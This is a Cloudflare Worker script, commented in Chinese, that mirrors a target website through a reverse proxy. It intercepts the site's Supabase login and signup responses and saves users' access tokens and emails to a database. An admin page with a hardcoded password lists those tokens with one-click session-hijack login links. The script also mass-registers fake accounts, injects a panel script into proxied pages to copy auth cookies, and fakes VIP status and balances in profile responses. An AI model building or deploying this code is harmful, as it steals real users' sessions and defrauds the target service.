/**
 * 魅魔科技 - 终极科研核心 V5.0 (完全动态版)
 * 目标：dzmm.ilqx.dpdns.org -> 目标原站
 * 功能：D1持久化、批量刷取、属性修改、UI重塑
 */

const TARGET_URL = "https://www.xn--i8s951di30azba.com"; // 原站地址
const ADMIN_CONFIG = {
    user: "admin",
    pass: "123456" // 你可以自行修改
};

// 1. D1 数据库初始化 SQL
const INIT_SQL = `
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id TEXT UNIQUE,
    email TEXT,
    cookie TEXT,
    balance TEXT DEFAULT '0.00',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);`;

// 2. 网站全局美化 CSS (注入到原站页面)
const GLOBAL_STYLE = `
<style>
    /* 全局 UI 重塑 */
    :root { --m-pink: #ff007f; --m-purple: #7a00ff; --glass: rgba(15, 15, 20, 0.85); }
    body { background: #050505 !important; color: #e0e0e0 !important; font-family: 'Inter', system-ui, sans-serif !important; }
    
    /* 玻璃拟态卡片 */
    div[class*="card"], .bg-white, .panel { 
        background: var(--glass) !important; 
        backdrop-filter: blur(12px) !important; 
        border: 1px solid rgba(255, 255, 255, 0.1) !important;
        border-radius: 20px !important;
        box-shadow: 0 10px 30px rgba(0,0,0,0.5) !important;
        transition: transform 0.3s ease, box-shadow 0.3s ease !important;
    }
    div[class*="card"]:hover { transform: translateY(-5px); box-shadow: 0 15px 40px rgba(255, 0, 127, 0.2) !important; }

    /* 按钮美化 */
    button, .btn {
        background: linear-gradient(45deg, var(--m-pink), var(--m-purple)) !important;
        border: none !important;
        border-radius: 12px !important;
        color: white !important;
        font-weight: 600 !important;
        text-transform: uppercase;
        letter-spacing: 1px;
        transition: 0.3s !important;
    }
    button:hover { filter: brightness(1.2); box-shadow: 0 0 20px var(--m-pink); }

    /* 滑动特效 */
    .fade-in-up { animation: fadeInUp 0.8s ease-out forwards; }
    @keyframes fadeInUp {
        from { opacity: 0; transform: translateY(30px); }
        to { opacity: 1; transform: translateY(0); }
    }
    
    /* 隐藏原站冗余元素 */
    #ad-container, .ads { display: none !important; }
</style>
`;

// 3. 魅魔控制台脚本 (增强属性修改)
const CONSOLE_JS = `
<script>
(function() {
    const STATE = { admin: "${ADMIN_CONFIG.user}", status: "正在修改注入" };

    function initPanel() {
        const panel = document.createElement('div');
        panel.innerHTML = \`
            <div id="mm-console" style="position:fixed; bottom:20px; left:20px; z-index:10000; background:rgba(0,0,0,0.9); border:2px solid #ff007f; border-radius:15px; width:320px; color:#fff; font-family:monospace; overflow:hidden; box-shadow:0 0 20px #ff007f;">
                <div style="background:#ff007f; padding:8px; font-weight:bold; display:flex; justify-content:space-between;">
                    <span>MEIMU TECH CORE V5.0</span>
                    <span id="mm-status" style="font-size:10px;">\${STATE.status}</span>
                </div>
                <div style="padding:15px; max-height:400px; overflow-y:auto;">
                    <div style="margin-bottom:10px; border-bottom:1px solid #333; padding-bottom:5px;">
                        <strong>账号获取</strong>
                        <button onclick="window.mm_regGuest()" style="width:100%; margin-top:5px; background:#333; color:#fff; border:1px solid #ff007f; cursor:pointer;">模仿/刷取游客账号</button>
                    </div>
                    <div id="mm-account-info" style="font-size:11px; color:#0f0; margin-bottom:10px;"></div>
                    <div style="margin-bottom:10px;">
                        <strong>属性控制 (真实注入)</strong>
                        <input id="mm-name" placeholder="改名字" style="width:100%; background:#111; color:#fff; border:1px solid #444; margin:5px 0;">
                        <select id="mm-gender" style="width:100%; background:#111; color:#fff; border:1px solid #444;">
                            <option value="male">男</option>
                            <option value="female">女</option>
                            <option value="secret">魅魔</option>
                        </select>
                        <button onclick="window.mm_updateProfile()" style="width:100%; margin-top:5px; background:#7a00ff; color:#fff; border:none; cursor:pointer; height:30px;">执行修改</button>
                    </div>
                    <button onclick="window.mm_copyCookie()" style="width:100%; background:#111; border:1px solid #ff007f; color:#ff007f; cursor:pointer;">一键复制当前 Cookie</button>
                    <button onclick="window.mm_goAdmin()" style="width:100%; margin-top:10px; background:none; border:none; color:#666; font-size:10px; cursor:pointer;">管理员后台</button>
                </div>
            </div>
        \`;
        document.body.appendChild(panel);
    }

    // 逻辑实现
    window.mm_regGuest = async () => {
        document.getElementById('mm-status').innerText = "正在刷取账号...";
        const res = await fetch('/api/guest-reg', { method: 'POST' });
        const data = await res.json();
        if(data.success) {
            alert('获取成功！Cookie 已上传数据库。\\n自动刷新登录...');
            location.reload();
        }
    };

    window.mm_updateProfile = async () => {
        const name = document.getElementById('mm-name').value;
        const gender = document.getElementById('mm-gender').value;
        document.getElementById('mm-status').innerText = "正在注入数据...";
        
        // 发送给 Worker 拦截，模拟真实 PATCH
        const res = await fetch('/rest/v1/profiles', {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: name, gender: gender })
        });
        
        if(res.ok) alert('属性修改指令已注入，刷新生效');
    };

    window.mm_copyCookie = () => {
        const cookie = document.cookie.split('; ').find(row => row.startsWith('sb-rls-auth-token='));
        if(cookie) {
            navigator.clipboard.writeText(cookie.split('=')[1]);
            alert('Cookie 已复制到剪贴板');
        } else alert('未检测到登录令牌');
    };

    window.mm_goAdmin = () => {
        const pass = prompt('请输入管理员密码');
        if(pass === "${ADMIN_CONFIG.pass}") location.href = '/admin-console';
    };

    window.addEventListener('load', () => {
        initPanel();
        // 给页面元素增加滑动动画
        document.querySelectorAll('div, section, table').forEach((el, i) => {
            if(i < 20) el.classList.add('fade-in-up');
        });
    });
})();
</script>
`;

export default {
    async fetch(request, env) {
        const url = new URL(request.url);

        // --- 0. D1 自动初始化 ---
        if (env.DB) {
            await env.DB.prepare(INIT_SQL).run();
        }

        // --- 1. 管理员后台逻辑 ---
        if (url.pathname === "/admin-console") {
            return this.handleAdmin(env);
        }

        // --- 2. 内部 API：游客刷取 ---
        if (url.pathname === "/api/guest-reg") {
            return this.batchRegister(env, 1);
        }

        // --- 3. 内部 API：批量注册 ---
        if (url.pathname === "/api/batch-reg") {
            return this.batchRegister(env, 10);
        }

        // --- 4. 拦截 Supabase 登录/注册以采集数据 ---
        if (request.method === "POST" && (url.pathname.includes("/auth/v1/signup") || url.pathname.includes("/auth/v1/token"))) {
            return this.captureAuth(request, env);
        }

        // --- 5. 核心反代逻辑 ---
        return this.proxyRequest(request, env);
    },

    async handleAdmin(env) {
        const { results } = await env.DB.prepare("SELECT * FROM users ORDER BY created_at DESC").all();
        const rows = results.map(u => `
            <tr style="border-bottom:1px solid #333;">
                <td style="padding:10px;">${u.user_id.substring(0,8)}...</td>
                <td>${u.email || '游客'}</td>
                <td><button onclick="copy('${u.cookie}')">复制</button></td>
                <td>${u.balance}</td>
                <td><a href="/?login_token=${u.cookie}">登录</a></td>
            </tr>
        `).join('');

        const html = `<html><body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
            <h2>魅魔数据库账号管理</h2>
            <button onclick="fetch('/api/batch-reg')">启动批量刷取 (10个)</button>
            <table style="width:100%;margin-top:20px;text-align:left;">
                <thead><tr><th>UID</th><th>账号</th><th>Cookie</th><th>余额</th><th>操作</th></tr></thead>
                <tbody>${rows}</tbody>
            </table>
            <script>function copy(t){navigator.clipboard.writeText(t);alert('OK');}</script>
        </body></html>`;
        return new Response(html, { headers: { "Content-Type": "text/html" } });
    },

    async captureAuth(request, env) {
        const response = await fetch(request.clone());
        if (response.ok) {
            const clone = await response.clone().json();
            const token = clone.access_token;
            const uid = clone.user?.id;
            const email = clone.user?.email || "guest_" + Math.random().toString(36).slice(-5);
            
            if (token && uid) {
                await env.DB.prepare("INSERT OR REPLACE INTO users (user_id, email, cookie) VALUES (?, ?, ?)")
                    .bind(uid, email, token).run();
            }
        }
        return response;
    },

    async batchRegister(env, count) {
        // 模拟批量匿名注册
        for (let i = 0; i < count; i++) {
            const dummyEmail = `mm_${Math.random().toString(36).slice(-8)}@succubus.tech`;
            const res = await fetch(`${TARGET_URL}/auth/v1/signup`, {
                method: "POST",
                headers: { "Content-Type": "application/json", "apikey": "SUPABASE_KEY_HERE" }, // 此处 key 从 HAR 中提取
                body: JSON.stringify({ email: dummyEmail, password: "password123" })
            });
            // 自动会被 captureAuth 拦截并存入 D1
        }
        return new Response(JSON.stringify({ success: true, count }));
    },

    async proxyRequest(request, env) {
        const url = new URL(request.url);
        url.hostname = new URL(TARGET_URL).hostname;

        const headers = new Headers(request.headers);
        headers.set("Host", url.hostname);
        headers.set("Referer", TARGET_URL);

        // 如果 URL 带有 login_token，则写入 Cookie
        const loginToken = url.searchParams.get("login_token");
        
        let response = await fetch(new Request(url, {
            method: request.method,
            headers: headers,
            body: request.body,
            redirect: "manual"
        }));

        // 处理登录重定向
        if (loginToken) {
            const newResp = new Response(null, { status: 302, headers: response.headers });
            newResp.headers.set("Set-Cookie", `sb-rls-auth-token=${loginToken}; Path=/; Max-Age=3600`);
            newResp.headers.set("Location", "/");
            return newResp;
        }

        const contentType = response.headers.get("content-type") || "";

        // 注入 UI 和控制台
        if (contentType.includes("text/html")) {
            let html = await response.text();
            html = html.replace("</head>", `${GLOBAL_STYLE}</head>`);
            html = html.replace("</body>", `${CONSOLE_JS}</body>`);
            return new Response(html, { headers: response.headers });
        }

        // 动态修改个人资料 API 响应 (让修改看起来立即生效)
        if (url.pathname.includes("/rest/v1/profiles")) {
            const data = await response.json();
            if (Array.isArray(data)) {
                data.forEach(p => {
                    p.is_vip = true;
                    p.balance = 99999.00;
                });
            }
            return new Response(JSON.stringify(data), { headers: response.headers });
        }

        return response;
    }
};